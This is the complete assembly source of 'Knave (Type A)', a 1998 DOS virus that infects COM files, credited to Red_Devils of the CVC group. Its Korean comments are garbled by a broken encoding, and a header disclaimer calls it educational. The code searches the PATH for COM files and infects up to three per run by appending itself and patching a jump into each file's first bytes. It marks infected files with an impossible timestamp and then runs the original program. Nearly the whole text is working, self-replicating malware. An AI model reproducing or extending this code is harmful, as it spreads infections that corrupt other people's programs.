;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;					       \\\\\\\	\	\   \\\\\\\
;                                             \          \     \   \
;          Knave  (Type A)                    \           \   \    \    98/05
;					      \ 	   \ \	   \
;                                              \\\\\\\      \       \\\\\\\ #04
;
; Virus Name : Knave
; Author     : Red_Devils
; Group      : CVC
; Origin     : Corea
; Date       : 1998/03/25
; Type       : Non Resident COM
;
;   !*< ��I�� ���� >********************************************************!
;   *                                                                        *
;   * �w�� !                                                                 *
;   *        �� �����e �a�B�ⷥ ����a���e �a�w�A�ᴡ �s���a. �����e ��      *
;   *        �����i �a�wЁ�� �i���a�e ��� ���A�A ��Ё�ᕡ �����i ���� �g    *
;   *        �s���a. ���e �����e �i�i ���e �a�q�A�A ���s���a.                *
;   *                                                                        *
;   * Warning !                                                              *
;   *        This information is for educational purposes only. We are       *
;   *        not responsible for any problems caused by the use of this      *
;   *        information. Responsibility is entirely placed on the reader    *
;   *                                                                        *
;   !************************************************************************!
;
; Miny2 (Type E) �i  ����Ж�a. Miny2 ���e ���a �a�e �w���a�� �b���E�a.
;
; 1. PATH �i ���wЁ�� �q�q ��ǩ �a���i �x�e�a.
; 2. �A�a���a �e�w�i ɷЁ�� �I�a ���a�U�i ���i ϩ�a�a ���a.
;
; ���� ���e �ᶅ ��Ё�i ��Ё�� �i�a�e ���a�e �a�w�a�� �g�v�a. �⦅�A ���� ��
; �����w��a�A�� ���e�A�� �a���e, �w�wӡ �g�e AV �A��e �a������ ���e�a�� ���e
; �a.
;
; PATH �i �a�w�a�� ��Ё�� ���a�� �q���i �a�w�e�a.
;
; Get_PathAddress : �ŉw�w�b�A�� PATH= �i �x�a�� ���弁 ���Bɡ���i �a�aǥ�a.
; Use_Path        : �ŉw�w�b�� �w���i ���ᝡ ���a�a�� �a�q �w���i �a�aǥ�a.
;
; ! Knave (Type A) : �w���A�� COM �a�� �q�q
;
;
; AV Test :
; Heuristic Test :
;
;
; TK-MAN : ALT-X ���ⷡ ������ �A���s���a. !
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

            .MODEL   TINY
            .CODE
            .286
            org   0h

 VIRLEN     equ   (End_Virus - Knave)   ; �a����a ����

 Knave:
            mov   ax,cs                 ;
 AddSeg:    add   ax,0010h              ; �a����a�a ������ �A�a���a �A�� ���b
            push  ax                    ; �A���� ��å�a.
            mov   ax,offset New_Segment ;
            push  ax                    ;
            retf                        ;

 New_Segment:
            push  cs                    ;
            pop   ds                    ; cs=ds

            mov   OldSegment, es        ; ���� �A�a���a ��w
            mov   ax, word ptr es:[002Ch]
            mov   Enviraddr,ax

            push  cs                    ;
            pop   es                    ;

            mov   si, offset Com_Head   ; �|���� ����
            mov   di, offset Com_Head2  ; �q�� ���a
            movsw
            movsw

            mov   ah,19h                ;
            int   21h
            add   al,'A'
            mov   byte ptr OldDir, al
            mov   word ptr OldDir+1,'\:'

            mov   ah,47h
            xor   dl,dl                 ; �� ���Bɡ�� ��w
            mov   si, offset OldDir + 3 ;
            int   21h                   ;

            mov   byte ptr Count,00     ; �q�q�a���� 0

            call  Get_Path_Address      ; �w�� ���� �苡

            mov   ah,2fh                ; DTA ���� �苡
            int   21h
            push  es
            push  bx

            push  cs
            pop   es

            mov   ah,1ah                ;
            mov   dx, offset NewDTA     ; ������ DTA ����
            int   21h

 FindFirst:
            mov   ah,4Eh                ; �a�� �x��
            mov   cx,00100011B          ; �a�� ����
            lea   dx,Match_COM          ; �x���a �a�e �a�� (*.c?m)
 Find:      int   21h
            jnc   callInfect            ; �A��e �a�e �w���� ����
            call  Use_PATH
            cmp   al, 0FFh              ; No More Path ?
            jz    Set_OldDir
            jmp   FindFirst
 callInfect:
            call  ChkInfected           ; �q�q ��˥ ѡ
            cmp   byte ptr Count,3      ; 3 �� �q�q ���v�a ?
            jz    Set_OldDir            ; �a��e �q�q �ɕ� �{
            mov   ah,4Fh                ; �a�q �a�� �x��
            jmp   Find

 Set_OldDir:
            mov   ah, 0Eh
            mov   dl, byte ptr OldDir
            sub   dl, 'A'
            int   21h

            mov   ah,3Bh                ; ���� ���Bɡ���� ����
            lea   dx, OldDir
            int   21h

            pop   dx
            pop   ds
            mov   ah, 1Ah               ;
            int   21h

            push  cs
            pop   ds

            mov   ax, word ptr OldSegment
            mov   es,ax
            push  ax
            mov   ax,100h
            push  ax
            mov   si, offset Com_Head2  ; COM �|���� ����
            mov   di,0FFh
            inc   di
            movsw                       ; �|���� 4 �a���a ����
            movsw                       ;
            xor   ax,ax
            push  es
            pop   ds
            retf                        ; ���� COM �a�� ��З

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
; ���w : PathAddr �A ��w�E �����t�i PathBuffer �� ���a�eҁ Ё�w ���Bɡ����
;        �����e�a. PathAddr �� 0 ���e �ᷡ�w�� �w���a ���a.
;
; ���b : None
; ���� : ��  �w : Ё�w PATH �� ����
;        �A�ᯡ : AL = FFh
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 Use_PATH   proc  near                  ; �ᷡ�w �a�w�i �w���a
            push  ds
            mov   al, 0FFh
            cmp   word ptr PathAddr,0000; ���e�a?
            jz    Use_Path_Exit
            xor   al,al
 Set_PathInit:
            mov   si, word ptr PathAddr ; �w�� ��á ���a�U
            mov   ds, word ptr EnvirAddr; �ŉw�b�b ����
            mov   di, offset PathBuffer ; �a�� ���q

 UP_Loop:   lodsb                       ;
            dec   al
            cmp   AL, ';'-1             ; ���Bɡ�� ���i���a?
            jz    UP_01
            cmp   al,0FFh               ; PATH �{���a?
            jz    NomorePATH
            inc   al
            stosb                       ; ���a
            jmp   UP_Loop

 NomorePATH:
            xor   si,si                 ; �ᷡ�w�� ���Bɡ���a ���a.

 UP_01:     mov   word ptr CS:PathAddr,SI    ; �w�� �����t
            xor   al,al
            stosb
            push  cs
            pop   ds

            mov   ah, 0Eh
            mov   dl, byte ptr PathBuffer
            sub   dl, 'A'
            int   21h
            jc    Use_Path

            pusha
            mov   si, offset PathBuffer
 print_loop:
            lodsb
            mov   ah,2
            mov   dl,al
            int   21h
            or    dl,dl
            jnz   print_loop
            popa

            mov   ah,3Bh                ; Ё�w ���Bɡ���� ����
            mov   dx, offset PathBuffer
            Int   21h
            jc    Use_Path
 Use_Path_Exit:
            pop   ds
            ret
 Use_Path   endp

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
; ���A �a����a �q�q ��˥
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 ChkInfected:                           ; �q�q �a���i �·��e�a.
            cmp   word ptr NewDTA+1Eh,'OC' ; COMMAND.COM ���a ?
            jz    Skip_thisfile
            mov   al,NewDTA+16h         ; 62 �� ���� ��a�e�a.
            and   al,1Fh
            cmp   al,1Fh
            jnz   Infect
 Skip_thisfile:
            RET                         ; 62 �� ���e �a�q �a�� ��a�� ���ự

 Infect:    mov   ax, 4301h             ; ����/�a�� �����a�� �a��
            xor   cx,cx
            mov   dx, offset NewDta+1Eh
            int   21h
            jc    Skip_thisfile         ; �A�� �i��

            mov   ax, 3D02h             ; �a�� ���e
            int   21h
            jc    Skip_thisfile         ;

            xchg  ax,bx                 ; BX = �a��Ѕ�i

            mov   ax, 5700h             ; �a�� �b�� ���e �苡
            int   21h
            push  cx                    ; �b�� ���e ��w
            push  dx                    ;

            mov   ah, 3Fh               ; �|���� ����
            lea   dx, COM_Head          ; ���� ����
            mov   cx, 0004              ; 4 �a���a
            int   21h

            cmp   byte ptr COM_Head+1,'Z'
            jnz   lseek2                ; EXE �a�� ���a ?
            nop
            cmp   byte ptr COM_Head,'M'
            jz    error

 lseek2:
            mov   al,02                 ; �a�� �{�a�� ����
            call  lseek
            or    dx,dx                 ; 64 KB ���w���a ?
            jnz   Error                 ; �a�q ��a�� ���e ��ǡ�� �g����Ё��

            mov   dx,ax
            add   dx,0Fh                ; 16 �� ������ �e�e�a.
            and   dx,0FFF0h
            mov   al, 0
            call  lseek1

            push  ax
            mov   cl,04                 ; �A�a���a ���e (����/16) = �A�a���a
            shr   ax,cl
            add   ax,10h
            mov   word ptr AddSeg+1, ax
            pop   ax                    ;

            sub   ax,3                  ; ���a�t ���e
            mov   word ptr JumpCode+1,ax;

            mov   ah, 40h               ; �a����a �a��
            mov   cx, VIRLEN
            mov   dx, offset Knave
            int   21h

            mov   al,00                 ; ��q�a�� ����
            call  lseek

            mov   ah, 40h               ; ���a š�a �a��
            mov   cx,0004
            mov   byte ptr JumpCode,0EAh
            dec   byte ptr JumpCode     ; E9h = JMP
            mov   dx, offset JumpCode
            int   21h

            inc   byte ptr Count        ; �q�q ���� �w�a
 Error:
            pop   dx                    ; �a�� �b�� ���e ����
            pop   cx                    ;
            or    cx,+1Fh               ; 62 ���� �e�i��
            mov   ax, 5701h             ; �a�� �b�� ���e ����
            int   21h

            mov   ah, 3Eh               ; �a�� �h��
            int   21h
            RET

 lseek      Proc  Near                  ; ͡���� ����
            xor   dx,dx
 lseek1:
            xor   cx,cx
            mov   ah,40h                ; AH=42h
            inc   ah                    ;
            inc   ah
            int   21h
            ret
 lseek      Endp

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;                     �ŉw �w�b�A�� PATH= ��á �苡
;
; EnvirAddr  : �ŵw�w�b �����t
; PathAddr   : �a�w�i �w���� ����
; PathBuffer : ���Bɡ���i ������ ��Ё �a�w�A�e �w�� ����
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 Get_PATH_Address   Proc Near
            pusha
            push    ds
            mov     DS, word ptr EnvirAddr  ; �ŉw�w�b �����t
            xor     si,si
            mov     cx, 5000h           ; �e���U��
 Search_PATH:
            lodsb                       ; �x�e ���a�i 'PATH='
            cmp     AL,'P'              ; 'P' �i �x�v�a ?
            jnz     SP_Loop
            mov     ax,DS:[SI]
            cmp     ax,'TA'             ; TA ?
            jnz     SP_Loop
            cmp     word ptr DS:[SI+2],'=H'    ; H= (PATH=)
            jz      SavePATH
 SP_Loop:   loop    Search_PATH
 SavePATH:  add     SI,0004             ; SI �e �w���i �a�aǡ�� ���a.
            mov     word ptr CS:PathAddr,SI    ; �w���� ����
            mov     DI, offset PathBuffer
            pop     ds
            popa
            RET

 Get_PATH_Address   Endp

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
; Data �w�b
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 COM_head   db    0CDh,20h,90h,90h      ; COM �|����
 Match_COM  db    '*.c?m',00            ; COM �a�� �x��
 Virus_Name db    '[Knave] Type.A  by Red_Devils/CVC,Corea 98/04'
 End_Virus:                             ; ���A �ỡ�e �a����a �{

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
; �a���A�e ��w�A�� �g�e ����
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 COM_Head2  db    00,00,00,00           ; ���� COM �|����
 EnvirAddr  dw    ?                     ; �ŉw �w�b ����
 PathAddr   dw    ?                     ; �w�� ����
 OldSegment dw    ?                     ; ���� �A�a���a
 Count      db    ?                     ; �q�q ����
 JumpCode   db    0E9h,00,00,00         ; ���a �t
 PathBuffer db    80h dup ('$')         ;
 NewDTA     db    80h dup (00)          ; ������ DTA �w�b
 OldDir     db    80h dup (00)          ; �� ���Bɡ�� ��w �w��

            END   Knave

